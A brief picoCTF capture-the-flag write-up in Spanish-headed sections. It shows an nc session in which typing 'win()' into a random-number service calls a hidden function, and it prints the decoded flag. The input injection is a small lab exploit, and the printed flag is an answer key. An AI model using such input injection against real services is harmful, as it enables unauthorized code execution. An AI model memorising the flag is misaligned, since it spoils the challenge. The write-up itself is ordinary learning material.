## Descripción 
This service can provide you with a random number, but can it do anything else?

Additional details will be available after launching your challenge instance
## Hints
1. Can you point the program to a function that does something useful for you?
## Solución
```
DanielMtzC-picoctf@webshell:~$ nc saturn.picoctf.net 53198
Try entering "getRandomNumber" without the double quotes...
==> win()
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d 
'NoneType' object is not callable


picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}
```
## Notas

## Referencias
https://cyberchef.io/#recipe=From_Hex('Auto')&input=MHg3MCAweDY5IDB4NjMgMHg2ZiAweDQzIDB4NTQgMHg0NiAweDdiIDB4MzQgMHg1ZiAweDY0IDB4MzEgMHgzNCAweDZkIDB4MzAgMHg2ZSAweDY0IDB4NWYgMHgzMSAweDZlIDB4NWYgMHgzNyAweDY4IDB4MzMgMHg1ZiAweDcyIDB4MzAgMHg3NSAweDY3IDB4NjggMHg1ZiAweDM2IDB4NjUgMHgzMCAweDM0IDB4MzQgMHgzNCAweDMwIDB4NjQgMHg3ZCA